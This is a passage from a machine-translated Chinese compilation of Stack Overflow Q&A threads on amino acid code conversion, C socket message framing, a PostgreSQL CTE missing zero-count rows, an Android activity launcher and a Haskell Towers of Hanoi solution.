    while( tmp != NULL && tmp.into != n ){
         tmp=tmp.next;
    }
    L.head = tmp;
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-06T14:04:49.547

看看 java.util.LinkedList - 它似乎做同样的事情。

1）正确！由于头指针不指向任何内容（空指针），因此您的列表应被视为“空”并且应返回 size=0。

2）垃圾收集器很聪明。由于在您的“剪切”之后没有人指向 (5)，因此对象 5 可用于收集，接下来有 ​​8 个可用，然后是 4，然后是 12。收集器可能会立即发现它们。实际收集的顺序和时间取决于收集器的实现（在短/小程序中，收集器甚至可能根本不运行）。

# python - 如何使用 python 或 R 将三个字母的氨基酸代码转换为一个字母的代码？

> ID：12760271
> 
> 赞同：12
> 
> 时间：2012-10-06T13:39:20.090
> 
> 标签：python, r, bioinformatics, biopython

我有一个 fasta 文件，如下所示。我想将[三个字母代码](https://en.wikipedia.org/wiki/Amino_acid#Table_of_standard_amino_acid_abbreviations_and_properties)转换为一个字母代码。我怎样才能用 python 或 R 做到这一点？

```
>2ppo
ARGHISLEULEULYS
>3oot
METHISARGARGMET 
```

期望的输出

```
>2ppo
RHLLK
>3oot
MHRRM 
```

您的建议将不胜感激！

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2014-01-05T21:55:27.427

BioPython 已经内置了字典来帮助进行此类翻译。以下命令将向您显示可用字典的完整列表：

```
import Bio
help(Bio.SeqUtils.IUPACData) 
```

您要查找的预定义字典：

```
Bio.SeqUtils.IUPACData.protein_letters_3to1['Ala'] 
```

* * *

## 回答 #2

> 赞同：14
> 
> 时间：2012-10-06T13:55:39.800

使用字典查找单字母代码：

```
d = {'CYS': 'C', 'ASP': 'D', 'SER': 'S', 'GLN': 'Q', 'LYS': 'K',
     'ILE': 'I', 'PRO': 'P', 'THR': 'T', 'PHE': 'F', 'ASN': 'N', 
     'GLY': 'G', 'HIS': 'H', 'LEU': 'L', 'ARG': 'R', 'TRP': 'W', 
     'ALA': 'A', 'VAL':'V', 'GLU': 'E', 'TYR': 'Y', 'MET': 'M'} 
```

还有一个简单的函数可以将三个字母代码与整个字符串的一个字母代码匹配：

```
def shorten(x):
    if len(x) % 3 != 0: 
        raise ValueError('Input length should be a multiple of three')

    y = ''
    for i in range(len(x) // 3):
            y += d[x[3 * i : 3 * i + 3]]
    return y 
```

测试你的例子：

```
>>> shorten('ARGHISLEULEULYS')
'RHLLK' 
```

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2012-10-06T14:01:42.763

这是在 R 中执行此操作的一种方法：

```
# Variables:
foo <- c("ARGHISLEULEULYS","METHISARGARGMET")

# Code maps:
code3 <- c("Ala", "Arg", "Asn", "Asp", "Cys", "Glu", "Gln", "Gly", "His", 
"Ile", "Leu", "Lys", "Met", "Phe", "Pro", "Ser", "Thr", "Trp", 
"Tyr", "Val")
code1 <- c("A", "R", "N", "D", "C", "E", "Q", "G", "H", "I", "L", "K", 
"M", "F", "P", "S", "T", "W", "Y", "V")

# For each code replace 3letter code by 1letter code:
for (i in 1:length(code3))
{
    foo <- gsub(code3[i],code1[i],foo,ignore.case=TRUE)
} 
```

结果是 ：

```
> foo
[1] "RHLLK" "MHRRM" 
```

请注意，我更改了变量名称，因为变量名称不允许以 R 中的数字开头。

* * *

## 回答 #4

> 赞同：6
> 
> 时间：2012-10-06T13:53:23.033

```
>>> src = "ARGHISLEULEULYS"
>>> trans = {'ARG':'R', 'HIS':'H', 'LEU':'L', 'LYS':'K'}
>>> "".join(trans[src[x:x+3]] for x in range(0, len(src), 3))
'RHLLK' 
```

您只需要将其余条目添加到`trans`字典中。

**编辑：**

要完成其余部分`trans`，您可以执行此操作。文件`table`：

```
Ala A
Arg R
Asn N
Asp D
Cys C
Glu E
Gln Q
Gly G
His H
Ile I
Leu L
Lys K
Met M
Phe F
Pro P
Ser S
Thr T
Trp W
Tyr Y
Val V 
```

阅读：

```
trans = dict((l.upper(), s) for l, s in
             [row.strip().split() for row in open("table").readlines()]) 
```

* * *

## 回答 #5

> 赞同：4
> 
> 时间：2012-10-08T22:43:00.157

您可以尝试查看并安装[Biopython](http://biopython.org/wiki/Download)，因为您正在解析 .fasta 文件，然后转换为单字母代码。不幸的是，Biopython 只有函数 seq3（在包 Bio::SeqUtils 中），它与你想要的相反。IDLE 中的示例输出：

```
>>>seq3("MAIVMGRWKGAR*")
>>>'MetAlaIleValMetGlyArgTrpLysGlyAlaArgTer' 
```

不幸的是，没有“seq1”功能（还...），但我认为这可能对您将来有所帮助。至于你的问题，Junuxx 是正确的。创建一个字典并使用 for 循环以三个为一组读取字符串并进行翻译。这是一个与他提供的功能类似的功能，它包罗万象，也可以处理小写字母。

```
def AAcode_3_to_1(seq):
    '''Turn a three letter protein into a one letter protein.

    The 3 letter code can be upper, lower, or any mix of cases
    The seq input length should be a factor of 3 or else results
    in an error

    >>>AAcode_3_to_1('METHISARGARGMET')
    >>>'MHRRM'

    '''
    d = {'CYS': 'C', 'ASP': 'D', 'SER': 'S', 'GLN': 'Q', 'LYS': 'K',
     'ILE': 'I', 'PRO': 'P', 'THR': 'T', 'PHE': 'F', 'ASN': 'N', 
     'GLY': 'G', 'HIS': 'H', 'LEU': 'L', 'ARG': 'R', 'TRP': 'W', 'TER':'*',
     'ALA': 'A', 'VAL':'V', 'GLU': 'E', 'TYR': 'Y', 'MET': 'M','XAA':'X'}

    if len(seq) %3 == 0:
        upper_seq= seq.upper()
        single_seq=''
        for i in range(len(upper_seq)/3):
            single_seq += d[upper_seq[3*i:3*i+3]]
        return single_seq
    else:
        print("ERROR: Sequence was not a factor of 3 in length!") 
```

* * *

## 回答 #6

> 赞同：4
> 
> 时间：2014-06-18T07:03:44.123

Biopython 有一个很好的解决方案

```
>>> from Bio.PDB.Polypeptide import *
>>> three_to_one('ALA')
'A' 
```

对于您的示例，我将通过这一班轮解决它

```
>>> from Bio.PDB.Polypeptide import *
>>> str3aa = 'ARGHISLEULEULYS'
>>> "".join([three_to_one(aa3) for aa3 in [ "".join(g) for g in zip(*(iter(str3aa),) * 3)]])
>>> 'RHLLK' 
```

他们可能会批评我这种类型的一个班轮:)，但在我内心深处，我仍然爱着 PERL。

* * *

## 回答 #7

> 赞同：3
> 
> 时间：2012-10-06T18:53:33.963

使用 R：

```
convert <- function(l) {

  map <- c("A", "R", "N", "D", "C", "E", "Q", "G", "H", "I",
           "L", "K", "M", "F", "P", "S", "T", "W", "Y", "V")

  names(map) <- c("ALA", "ARG", "ASN", "ASP", "CYS", "GLU", "GLN",
                  "GLY", "HIS", "ILE", "LEU", "LYS", "MET", "PHE",
                  "PRO", "SER", "THR", "TRP", "TYR", "VAL")

  sapply(strsplit(l, "(?<=[A-Z]{3})", perl = TRUE),
         function(x) paste(map[x], collapse = ""))
}

convert(c("ARGHISLEULEULYS", "METHISARGARGMET"))
# [1] "RHLLK" "MHRRM" 
```

* * *

## 回答 #8

> 赞同：2
> 
> 时间：2015-08-28T11:19:04.757

另一种方法是使用 R 中的[seqinr](https://cran.r-project.org/web/packages/seqinr/index.html)和[iPAC](http://www.bioconductor.org/packages/release/bioc/html/iPAC.html)包。

```
# install.packages("seqinr")
# source("https://bioconductor.org/biocLite.R")
# biocLite("iPAC")

library(seqinr)
library(iPAC)

#read in file
fasta = read.fasta(file = "test_fasta.fasta", seqtype = "AA", as.string = T, set.attributes = F)
#split string
n = 3
fasta1 = lapply(fasta,  substring(x,seq(1,nchar(x),n),seq(n,nchar(x),n)))
#convert the three letter code for each element in the list 
fasta2 = lapply(fasta1, function(x) paste(sapply(x, get.SingleLetterCode), collapse = ""))

# > fasta2
# $`2ppo`
# [1] "RHLLK"
#
# $`3oot`
# [1] "MHRRM" 
```

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2013-07-05T06:51:19.777

```
my %aa_hash=(
  Ala=>'A',
  Arg=>'R',
  Asn=>'N',
  Asp=>'D',
  Cys=>'C',
  Glu=>'E',
  Gln=>'Q',
  Gly=>'G',
  His=>'H',
  Ile=>'I',
  Leu=>'L',
  Lys=>'K',
  Met=>'M',
  Phe=>'F',
  Pro=>'P',
  Ser=>'S',
  Thr=>'T',
  Trp=>'W',
  Tyr=>'Y',
  Val=>'V',
  Sec=>'U',                       #http://www.uniprot.org/manual/non_std;Selenocysteine (Sec) and pyrrolysine (Pyl)
  Pyl=>'O',
);

    while(<>){
            chomp;
            my $aa=$_;
            warn "ERROR!! $aa invalid or not found in hash\n" if !$aa_hash{$aa};
            print "$aa\t$aa_hash{$aa}\n";
    } 
```

使用此 perl 脚本将三元组 aa 代码转换为单字母代码。

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2018-05-07T18:43:35.750

Python 3 解决方案。

在我的工作中，令人烦恼的部分是氨基酸代码可以引用经常出现在 PDB/mmCIF 文件中的修改过的代码，例如

> 'Tih'-->'A'。

所以映射可以超过22对。Python 中的第 3 方工具，例如

> Bio.SeqUtils.IUPACData.protein_letters_3to1

无法处理。我最简单的解决方案是使用[http://www.ebi.ac.uk/pdbe-srv/pdbechem](http://www.ebi.ac.uk/pdbe-srv/pdbechem)查找映射并将异常映射添加到我自己的函数中的字典，每当我遇到它们时。

```
def three_to_one(three_letter_code):
    mapping = {'Aba':'A','Ace':'X','Acr':'X','Ala':'A','Aly':'K','Arg':'R','Asn':'N','Asp':'D','Cas':'C',
           'Ccs':'C','Cme':'C','Csd':'C','Cso':'C','Csx':'C','Cys':'C','Dal':'A','Dbb':'T','Dbu':'T',
           'Dha':'S','Gln':'Q','Glu':'E','Gly':'G','Glz':'G','His':'H','Hse':'S','Ile':'I','Leu':'L',
           'Llp':'K','Lys':'K','Men':'N','Met':'M','Mly':'K','Mse':'M','Nh2':'X','Nle':'L','Ocs':'C',
           'Pca':'E','Phe':'F','Pro':'P','Ptr':'Y','Sep':'S','Ser':'S','Thr':'T','Tih':'A','Tpo':'T',
           'Trp':'W','Tyr':'Y','Unk':'X','Val':'V','Ycm':'C','Sec':'U','Pyl':'O'} # you can add more
    return mapping[three_letter_code[0].upper() + three_letter_code[1:].lower()] 
```

另一种解决方案是在线检索映射（但 url 和 html 模式可能会随着时间而改变）：

```
import re
import urllib.request

def three_to_one_online(three_letter_code):
    url = "http://www.ebi.ac.uk/pdbe-srv/pdbechem/chemicalCompound/show/" + three_letter_code
    with urllib.request.urlopen(url) as response:
        single_letter_code = re.search('\s*<td\s*>\s*<h3>One-letter code.*</h3>\s*</td>\s*<td>\s*([A-Z])\s*</td>', response.read().decode('utf-8')).group(1)
    return single_letter_code 
```

为了简单起见，这里我直接使用 re 而不是 html 解析器。

希望这些能有所帮助。

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2017-11-07T15:40:01.970

对于那些在 2017 年及以后登陆这里的人：

这是一个单行 Linux bash 命令，用于将蛋白质氨基酸三字母代码转换为文本文件中的单字母代码。我知道这不是很优雅，但我希望这可以帮助搜索相同内容并希望使用单行命令的人。

```
sed 's/ALA/A/g;s/CYS/C/g;s/ASP/D/g;s/GLU/E/g;s/PHE/F/g;s/GLY/G/g;s/HIS/H/g;s/HID/H/g;s/HIE/H/g;s/ILE/I/g;s/LYS/K/g;s/LEU/L/g;s/MET/M/g;s/ASN/N/g;s/PRO/P/g;s/GLN/Q/g;s/ARG/R/g;s/SER/S/g;s/THR/T/g;s/VAL/V/g;s/TRP/W/g;s/TYR/Y/g;s/MSE/X/g' < input_file_three_letter_code.txt > output_file_single_letter_code.txt 
```

上面原始问题的解决方案，作为单个命令行：

```
sed 's/.\{3\}/& /g' | sed 's/ALA/A/g;s/CYS/C/g;s/ASP/D/g;s/GLU/E/g;s/PHE/F/g;s/GLY/G/g;s/HIS/H/g;s/HID/H/g;s/HIE/H/g;s/ILE/I/g;s/LYS/K/g;s/LEU/L/g;s/MET/M/g;s/ASN/N/g;s/PRO/P/g;s/GLN/Q/g;s/ARG/R/g;s/SER/S/g;s/THR/T/g;s/VAL/V/g;s/TRP/W/g;s/TYR/Y/g;s/MSE/X/g' | sed 's/ //g' < input_file_three_letter_code.txt > output_file_single_letter_code.txt 
```

解释：

[1]`sed 's/.\{3\}/& /g'`将拆分序列。它会在每 3 个字母后添加一个空格。

[2] 管道中的第二个 '`sed'`命令将获取上面的输出并转换为单字母代码。`s/XYZ/X/g;` 为该命令添加任何非标准残基。

[3] 第三个 ' `sed`' 命令，`sed 's/ //g'`将删除空格。

# c - 告诉客户端何时完成写入缓冲区

> ID：12760278
> 
> 赞同：0
> 
> 时间：2012-10-06T13:39:46.677
> 
> 标签：c, sockets

我有一个简单的套接字服务器，它应该接收一个字符串并返回另一个。收到的字符串是多行的。有没有办法告诉客户端何时完成发送而没有在末尾添加预定义的传输结束字符集？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-06T13:49:48.957

您必须提前知道（1）消息的长度是多少或（2）什么构成消息的结尾。因此，要么（1）为消息添加预期长度的前缀；或 (2) 使所有消息的大小相同；(3) 定义不同的消息类型，其中长度是预先知道的；或 (4) 准确定义什么构成消息的结尾（也可能是开头）。

在您的情况下，可能连续两个换行符可以向 EOM 发出信号。或者如果字符串中没有空字节，则为空字节。或者只是让客户端先发送长度，然后再发送消息。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-06T14:10:31.853

除了所说的之外，您也许可以定义一个小的固定大小的结构来用作协议消息头。正如 wildplasser 添加的那样，您应该注意[字节顺序](http://en.wikipedia.org/wiki/Endianness)和大小。

如果您正在使用 Berkeley 套接字 API，您应该查看**htons() 和 htonl()**以说明可能不同的网络[字节顺序](http://www.gnu.org/software/libc/manual/html_node/Byte-Order.html)。关于跨不同平台的整数大小，[这个线程](https://stackoverflow.com/questions/1229131/how-to-declare-a-32-bit-integer-in-c)可能很有趣。

```
// NOTE: take care to know if you need to ensure constant MsgHeader size in bytes
// among platforms.
typedef _MsgHeader {
  int m_Type;
  int m_Length;
} MsgHeader; 
```

每当通信的参与者希望发送一个字符串时，该参与者必须首先发送一条带有**sizeof(MsgHeader)**的消息，而接收者（在本例中为服务器）期待一条消息，只需读取**sizeof(MsgHeader) bytes**，将结果转换为**MsgHeader**并继续读取**m_Length 字段**以找出从随后将被发送的字符串中期望的字节数。

然后，您还可以使用**m_Type 字段**来区分消息上下文，但如果现在不需要，只需在每条消息的开头发送长度即可。

您提到接收到的字符串是多行的，所以我假设您的意思是它们都由换行符分隔。如果是这样，您可以将发件人的字符串连接成一个更大的字符串，获取它的长度并将其作为一个整体发送，假设没有某些特定于问题的方面可以防止这种情况发生。只是提醒一下，将接收缓冲区设置为零可能很有用，因此当您接收到字符串时，它的末尾已经有一个终止字符 '\0'，以防您没有在信息。

希望对您有所帮助！

# sql - 如何使此 CTE 查询打印值为 0 的行？

> ID：12760280
> 
> 赞同：1
> 
> 时间：2012-10-06T13:39:51.810
> 
> 标签：sql, postgresql, join, aggregate-functions, common-table-expression

我有一个基于 CTE 的查询，我使用连接传递了大约 2600 个 4 元组纬度/经度值 - 这些纬度经度 4 元组已被 ID 标记并保存在名为坐标的第二个表中。这些左上角和右下角的纬度/经度值被传递到 CTE，以显示给定两个时间戳在这些坐标内发出的请求数量（每小时）。-我能够在时间戳内获得每天的总请求数给定，即每个指定日期的用户请求总数。（例如，用户选择在每个星期三或星期三和星期四等查看 - 在 2012 年 1 月 1 日至 31 日之间的 11:55 和 22:04 之间，对于我通过的每个纬度/经度 4 元组。）但我无法获得行结果中 zcount 为 0，我只得到 zcount > 0 的行。我的查询如下：（注意[如果Erwin Brandstetter](https://stackoverflow.com/users/939860/erwin-brandstetter)看到了这个，我检查了关于我之前问题的聊天室讨论并将`coordinates`值设置为，`NOT NULL`因为你说坐标可以是`null`设计的，但不知何故我仍然有同样的问题。——虽然我可能听错了你的意思，因为我当时发烧得很厉害——

```
WITH v AS (
   SELECT '2012-1-1 11:55:11'::timestamp AS _from -- provide times once
         ,'2012-1-31 22:02:21'::timestamp AS _to
   )
, q AS (
   SELECT c.coordinates_id
        , date_trunc('hour', t.calltime) AS stamp
        , count(*) AS zcount
   FROM   v
   JOIN   mytable t ON  t.calltime BETWEEN v._from AND v._to
                   AND (t.calltime::time >= v._from::time AND
                        t.calltime::time <= v._to::time) AND 
(extract(DOW from t.calltime) = 3)
   JOIN   coordinates c ON (t.lat, t.lon) 
                   BETWEEN (c.bottomrightlat, c.topleftlon)
                       AND (c.topleftlat, c.bottomrightlon)
   GROUP BY c.coordinates_id, date_trunc('hour', t.calltime)
   )
, cal AS (
   SELECT generate_series('2012-1-1 11:00:00'::timestamp
                        , '2012-1-31 23:00:00'::timestamp
                        , '1 hour'::interval) AS stamp)
SELECT q.coordinates_id, cal.stamp::date, sum(q.zcount) AS zcount
FROM   v, cal
LEFT   JOIN q USING (stamp)
WHERE  extract(hour from cal.stamp) BETWEEN extract(hour from v._from)
                                        AND extract(hour from v._to)
AND    extract(DOW from cal.stamp) = 3 
AND    cal.stamp >= v._from
AND    cal.stamp <= v._to
GROUP  BY 1,2
ORDER  BY 1,2; 
```

我执行这个查询时得到的输出基本上是这样的（通常我有大约 10354 行返回，不包括 zcount 为 0 的行，只是为了相似而提供了两个坐标）：

```
coordinates_id  | stamp      | zcount
1               ;"2012-01-04";      2
1               ;"2012-01-11";      3
1               ;"2012-01-18";      2
2               ;"2012-01-04";      2
2               ;"2012-01-11";      3
2               ;"2012-01-18";      2 
```

但是，应该是这样的，其中 zcount 为 0 的所有行也应与 zcount 非零的行一起打印 - 例如，对于 ID 为 1 和 2 的两个坐标，zcount 为 0 的 1 月 25 日也应打印在例子-：

```
coordinates_id  | stamp      | zcount
1               ;"2012-01-04";      2
1               ;"2012-01-11";      3
1               ;"2012-01-18";      2
1               ;"2012-01-25";      0
2               ;"2012-01-04";      2
2               ;"2012-01-11";      3
2               ;"2012-01-18";      2
2               ;"2012-01-25";      0 
```

zcount 值比实际值大得多的更新版本。-还有0 zcount的行仍然没有显示-

```
WITH v AS (
   SELECT '2012-1-1 11:55:11'::timestamp AS _from -- provide times once
         ,'2012-1-31 22:02:21'::timestamp AS _to
   )
, q AS (
   SELECT c.coordinates_id
        , date_trunc('hour', t.calltime) AS stamp
        , count(*) AS zcount
   FROM   v
   JOIN   mytable t ON  t.calltime BETWEEN v._from AND v._to
                   AND (t.calltime::time >= v._from::time AND
                        t.calltime::time <= v._to::time) AND 
(extract(DOW from t.calltime) = 3)
   JOIN   coordinates c ON (t.lat, t.lon) 
                   BETWEEN (c.bottomrightlat, c.topleftlon)
                       AND (c.topleftlat, c.bottomrightlon)
   GROUP BY c.coordinates_id, date_trunc('hour', t.calltime)
   )
, cal AS (
   SELECT generate_series('2012-1-1 11:00:00'::timestamp
                        , '2012-1-31 23:00:00'::timestamp
                        , '1 hour'::interval) AS stamp)
, coordst AS ( 
   SELECT coordinates_id FROM coordinates)
SELECT q.coordinates_id, cal.stamp::date, COALESCE(sum(q.zcount),0) AS zcount
FROM   v, coordst, cal
LEFT   JOIN q USING (stamp)
WHERE  extract(hour from cal.stamp) BETWEEN extract(hour from v._from)
                                        AND extract(hour from v._to)
AND    extract(DOW from cal.stamp) = 3 
AND    cal.stamp >= v._from
AND    cal.stamp <= v._to
GROUP  BY 1,2
ORDER  BY 1,2; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-06T16:00:13.320

您需要一个不同的坐标 ID 列表来执行正确的 CROSS JOIN。1\. 在 WITH 中添加另一个条目。2\. 将其添加到您的 JOIN（FROM v,cal, coords）中。3\. 你的 zcount 会显示为 NULL，所以 COALESCE 它。

```
WITH v AS (
   SELECT '2012-1-1 11:55:11'::timestamp AS _from -- provide times once
         ,'2012-1-31 22:02:21'::timestamp AS _to
   )
, q AS (
   SELECT c.coordinates_id
        , date_trunc('hour', t.calltime) AS stamp
        , count(*) AS zcount
   FROM   v
   JOIN   mytable t ON  t.calltime BETWEEN v._from AND v._to
                   AND (t.calltime::time >= v._from::time AND
                        t.calltime::time <= v._to::time) AND 
(extract(DOW from t.calltime) = 3)
   JOIN   coordinates c ON (t.lat, t.lon) 
                   BETWEEN (c.bottomrightlat, c.topleftlon)
                       AND (c.topleftlat, c.bottomrightlon)
   GROUP BY c.coordinates_id, date_trunc('hour', t.calltime)
   )
, cal AS (
   SELECT generate_series('2012-1-1 11:00:00'::timestamp
                        , '2012-1-31 23:00:00'::timestamp
                        , '1 hour'::interval) AS stamp)
, coordst AS ( 
   SELECT DISTINCT coordinates_id FROM coordinates)
SELECT coordst.coordinates_id, cal.stamp::date, COALESCE(sum(q.zcount),0) AS zcount
FROM   v CROSS JOIN coordst CROSS JOIN cal
LEFT   JOIN q USING q.stamp = cal.stamp AND coordst.coordinates_id = q.coordinates_id
WHERE  extract(hour from cal.stamp) BETWEEN extract(hour from v._from)
                                        AND extract(hour from v._to)
AND    extract(DOW from cal.stamp) = 3 
AND    cal.stamp >= v._from
AND    cal.stamp <= v._to
GROUP  BY 1,2
ORDER  BY 1,2; 
```

# ios - 首先缓冲数据然后加载 -iOS

> ID：12760281
> 
> 赞同：1
> 
> 时间：2012-10-06T13:39:56.257
> 
> 标签：ios, json, nsstring, buffer

我计划实施以下网站。

用户点击播放按钮，它首先加载数据然后显示。我怎么能先加载所有数据？

有什么建议吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-06T13:41:33.790

您可以在后台异步加载它并向用户显示加载页面。

# android - 为 android 项目创建活动启动器，如 API 演示

> ID：12760283
> 
> 赞同：1
> 
> 时间：2012-10-06T13:40:06.440
> 
> 标签：android, api, list, android-activity

我正在创建一个活动启动器，以便它可以检测我的 Android 项目中的所有可用活动并显示为活动列表，并在我单击一个项目时启动。

![Android 的 API 演示](../Images/52942fcf50d745dbb216082d1aabcade.png)

它应该像谷歌 API 演示项目一样工作。我参考了 ApiDemos.java 并尝试将代码修改为 -->mainIntent.addCategory("com.mypackage")、getStringExtra(...)、putStringExtra(...) 并添加了一些“intent-filter” "category android:name="com.mypackage" 到 manifest 中的其他活动，但是只有 1 ，主要活动显示在列表中，其他活动不显示。如果您知道解决方案，请告诉我。非常感谢：

```
package com.example.android.apis;

import android.app.ListActivity;

public class ApiDemos extends ListActivity {

@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);

    Intent intent = getIntent();
    String path = intent.getStringExtra("com.example.android.apis.Path");

    if (path == null) {
        path = "";
    }

    setListAdapter(new SimpleAdapter(this, getData(path),
            android.R.layout.simple_list_item_1, new String[] { "title" },
            new int[] { android.R.id.text1 }));
    getListView().setTextFilterEnabled(true);
}

protected List<Map<String, Object>> getData(String prefix) {
    List<Map<String, Object>> myData = new ArrayList<Map<String, Object>>();

    Intent mainIntent = new Intent(Intent.ACTION_MAIN, null);
    mainIntent.addCategory(Intent.CATEGORY_SAMPLE_CODE);

    PackageManager pm = getPackageManager();
    List<ResolveInfo> list = pm.queryIntentActivities(mainIntent, 0);

    if (null == list)
        return myData;

    String[] prefixPath;
    String prefixWithSlash = prefix;

    if (prefix.equals("")) {
        prefixPath = null;
    } else {
        prefixPath = prefix.split("/");
        prefixWithSlash = prefix + "/";
    }

    int len = list.size();

    Map<String, Boolean> entries = new HashMap<String, Boolean>();

    for (int i = 0; i < len; i++) {
        ResolveInfo info = list.get(i);
        CharSequence labelSeq = info.loadLabel(pm);
        String label = labelSeq != null
                ? labelSeq.toString()
                : info.activityInfo.name;

        if (prefixWithSlash.length() == 0 || label.startsWith(prefixWithSlash)) {

            String[] labelPath = label.split("/");

            String nextLabel = prefixPath == null ? labelPath[0] :   labelPath[prefixPath.length];

            if ((prefixPath != null ? prefixPath.length : 0) == labelPath.length - 1) {
                addItem(myData, nextLabel, activityIntent(
                        info.activityInfo.applicationInfo.packageName,
                        info.activityInfo.name));
            } else {
                if (entries.get(nextLabel) == null) {
                    addItem(myData, nextLabel, browseIntent(prefix.equals("") ? nextLabel : prefix + "/" + nextLabel));
                    entries.put(nextLabel, true);
                }
            }
        }
    }

    Collections.sort(myData, sDisplayNameComparator);

    return myData;
}

private final static Comparator<Map<String, Object>> sDisplayNameComparator =
    new Comparator<Map<String, Object>>() {
    private final Collator   collator = Collator.getInstance();

    public int compare(Map<String, Object> map1, Map<String, Object> map2) {
        return collator.compare(map1.get("title"), map2.get("title"));
    }
};

protected Intent activityIntent(String pkg, String componentName) {
    Intent result = new Intent();
    result.setClassName(pkg, componentName);
    return result;
}

protected Intent browseIntent(String path) {
    Intent result = new Intent();
    result.setClass(this, ApiDemos.class);
    result.putExtra("com.example.android.apis.Path", path);
    return result;
}

protected void addItem(List<Map<String, Object>> data, String name, Intent intent) {
    Map<String, Object> temp = new HashMap<String, Object>();
    temp.put("title", name);
    temp.put("intent", intent);
    data.add(temp);
}

@Override
@SuppressWarnings("unchecked")
protected void onListItemClick(ListView l, View v, int position, long id) {
    Map<String, Object> map = (Map<String, Object>)l.getItemAtPosition(position);

    Intent intent = (Intent) map.get("intent");
    startActivity(intent);
}
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-06T15:05:24.820

我通过正确编辑 manyfest android:label 找到了解决方案：

```
<activity android:name=".app.HelloWorld" android:label="app/HelloWorld">
         <intent-filter>
        <action android:name="android.intent.action.MAIN" />
        <category android:name="com.tungnd.android.labs.TUNGND" />
         </intent-filter>
    </activity> 
```

# haskell - HASKELL : 解决河内的塔

> ID：12760285
> 
> 赞同：3
> 
> 时间：2012-10-06T13:40:22.977
> 
> 标签：haskell, towers-of-hanoi

下面的代码使用预定义的函数 moveLOD、swapLOI 和 swapLID 解决了 hanoi 返回移动列表的问题。

MoveLOD：将 1 个圆盘从第一个位置移动到三联体第三个位置的第三个销。此外，包含有关移动信息的字符串正在字符串列表中堆积。

```
type Pin = (Char, Int)        -- Represents a rod, named for a character and the number of disks in it.
type Plate = (Pin, Pin, Pin)  -- Represents the configuration of the three rods.(Origin,Intermediate,Destination
type Log = (Plate, [String])  -- Represents a state formed by the configuration of rods and a list of strings that will record the movements made by the algorithm.

moveLOD :: Log -> Log
moveLOD (((o,n), i ,(d,k)),s) = (((o,n-1), i ,(d,k+1)), (o:" -> " ++ [d]):s)

-- swapLOI: Change the positions of the origin rods and intermediate rods.
swapLOI:: Log->Log
swapLOI ((o,i,d),s) = ((i,o,d),s) 

-- swapoLID : Change the positions of the intermediate rods and destination rods.
swapLID:: Log->Log
swapLID ((o,i,d),s) = ((o,d,i),s)

hanoi :: Log -> Log
hanoi:: Int->Log->[String]
hanoi 1 log = transformaLista(moveLOD log)
hanoi n log = hanoi (n-1) (swapLID log) ++ hanoi 1 log ++ hanoi (n-1) (swapLOI(log))

changeToList::Log->[String]
changeToList(p,s) = s

callHanoi:: Int->[String]
callHanoi n = hanoi n ((('O',n),('I',0),('D',0)),[]) 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-06T14:17:35.487

```
hanoi :: Log -> Log
hanoi ((('o',0),i,d),s) = ((('o',0),('i',0),('d',0)), [])
hanoi ((('o',1),i,d),s) = moveLOD((('o',1),i,d),s)
hanoi ((('o',n),i,d),s)= hanoi(swapLOI(hanoi(swapLOI(swapLID(moveLOD(swapLID((('o',n),i,d),s))))))) 
```

仅定义第一个是的参数的函数`Char`，`Pin`您`Plate`还`'o'`需要提供当字符是其他东西时的方程。

当接收到不匹配任何有定义方程的模式的参数时，会引发“非穷举模式”错误。修复它的唯一方法是为剩余模式提供方程。

在您修改后的代码中，首先，您对原始引脚为空的情况的处理是不正确的，

```
hanoi (((o,0),i,d),s) = ((('o',0),('i',0),('d',0)),[]) 
```

意味着无论何时应用这种情况，结果都是相同的，无论是什么`d`和`i`是。当使用大于 2 的参数`hanoi`调用 from时，在某些时候原点变为空，并且由于调用链中的上面只有和，因此该常量结果会冒泡。你得到正确的结果(直接由第二个方程求解) 因为对then 的递归调用在原点上只有一个磁盘。`chamahanoi``hanoi``swapLOI``n == 2``n == 1``hanoi`

这种情况应该

```
hanoi (((o,0),i,d),s) = (((o,0),i,d),s) 
```

这仍然不会产生正确的结果（错误的移动顺序），因为一般情况下的递归是错误的。

你

*   将顶部圆盘移至中间销 ( `swapLID . moveLOD . swapLID`)；
*   然后将剩余的磁盘移动到目的地（`hanoi`），但这是不允许的，因为最小的磁盘在中间销上，因此不能在那里放置其他磁盘；
*   最后，使用（现在为空的）原始引脚作为中间引脚将磁盘从中间引脚移动到目的地。

你应该

*   将`n-1`磁盘从原点移动到中间销，
*   然后将底部（最大）磁盘移动到目的地，
*   最后，将`n-1`磁盘从中间移动到目的地。

如果没有额外的参数来跟踪要移动的磁盘数量，我看不到一种简单的方法。考虑一个四盘游戏。首先，顶部三个磁盘移动到中间销，然后底部磁盘移动到目标销。现在的任务是将三个磁盘从中间引脚移动到目标引脚，使用原始引脚作为助手。

正确的方法是顺序

1.  `i -> d` ( `([],[1,2,3],[4]) -> ([],[2,3],[1,4])`)
2.  `i -> o` ( `([],[2,3],[1,4]) -> ([2],[3],[1,4])`)
3.  `d -> o` ( `([2],[3],[1,4]) -> ([1,2],[3],[4])`)
4.  `i -> d` ( `([1,2],[3],[4]) -> ([1,2],[],[3,4])`)
5.  `o -> i` ( `([1,2],[],[3,4]) -> ([2],[1],[3,4])`)
6.  `o -> d` ( `([2],[1],[3,4]) -> ([],[1],[2,3,4])`)
7.  `i -> d` ( `([],[1],[2,3,4]) -> ([],[],[1,2,3,4])`)

在第 2 步之后，原始目标 pin 成为要从其中移动磁盘（嗯，一个）的 pin `o`，但在这种情况下不应移动最低的那些。如果唯一的信息是每个引脚上有多少个磁盘，以及磁盘应该从哪里移动到哪里，那如何实现呢？

如果您将类型更改`hanoi`为

```
hanoi :: Int -> Log -> Log 
```

并称之为

```
chamahanoi n = hanoi n ((('o',n),('i',0),('d',0)),[]) 
```

这很容易实现。

